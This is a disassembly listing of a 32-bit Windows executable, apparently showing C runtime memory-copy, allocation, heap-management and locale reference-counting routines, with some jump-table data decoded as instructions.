  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
  4266cc:	mov    DWORD PTR [ebp-0x1c],eax
  4266cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266d3:	call   0x4266e1
  4266d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266db:	call   0x42538b
  4266e0:	ret    
  4266e1:	push   0xc
  4266e3:	call   0x42547b
  4266e8:	pop    ecx
  4266e9:	ret    
  4266ea:	push   0x140
  4266ef:	push   0x0
  4266f1:	push   DWORD PTR ds:0x45e140
  4266f7:	call   DWORD PTR ds:0x429030
  4266fd:	test   eax,eax
  4266ff:	mov    ds:0x45df00,eax
  426704:	jne    0x426707
  426706:	ret    
  426707:	mov    ecx,DWORD PTR [esp+0x4]
  42670b:	and    DWORD PTR ds:0x45def8,0x0
  426712:	and    DWORD PTR ds:0x45defc,0x0
  426719:	mov    ds:0x45df08,eax
  42671e:	xor    eax,eax
  426720:	mov    DWORD PTR ds:0x45df04,ecx
  426726:	mov    DWORD PTR ds:0x45df0c,0x10
  426730:	inc    eax
  426731:	ret    
  426732:	mov    eax,ds:0x45defc
  426737:	lea    ecx,[eax+eax*4]
  42673a:	mov    eax,ds:0x45df00
  42673f:	lea    ecx,[eax+ecx*4]
  426742:	jmp    0x426756
  426744:	mov    edx,DWORD PTR [esp+0x4]
  426748:	sub    edx,DWORD PTR [eax+0xc]
  42674b:	cmp    edx,0x100000
  426751:	jb     0x42675c
  426753:	add    eax,0x14
  426756:	cmp    eax,ecx
  426758:	jb     0x426744
  42675a:	xor    eax,eax
  42675c:	ret    
  42675d:	push   ebp
  42675e:	mov    ebp,esp
  426760:	sub    esp,0x10
  426763:	mov    ecx,DWORD PTR [ebp+0x8]
  426766:	mov    eax,DWORD PTR [ecx+0x10]
  426769:	push   esi
  42676a:	mov    esi,DWORD PTR [ebp+0xc]
  42676d:	push   edi
  42676e:	mov    edi,esi
  426770:	sub    edi,DWORD PTR [ecx+0xc]
  426773:	add    esi,0xfffffffc
  426776:	shr    edi,0xf
  426779:	mov    ecx,edi
  42677b:	imul   ecx,ecx,0x204
  426781:	lea    ecx,[ecx+eax*1+0x144]
  426788:	mov    DWORD PTR [ebp-0x10],ecx
  42678b:	mov    ecx,DWORD PTR [esi]
  42678d:	dec    ecx
  42678e:	test   cl,0x1
  426791:	mov    DWORD PTR [ebp-0x4],ecx
  426794:	jne    0x426a71
  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
  42694a:	shr    ebx,cl
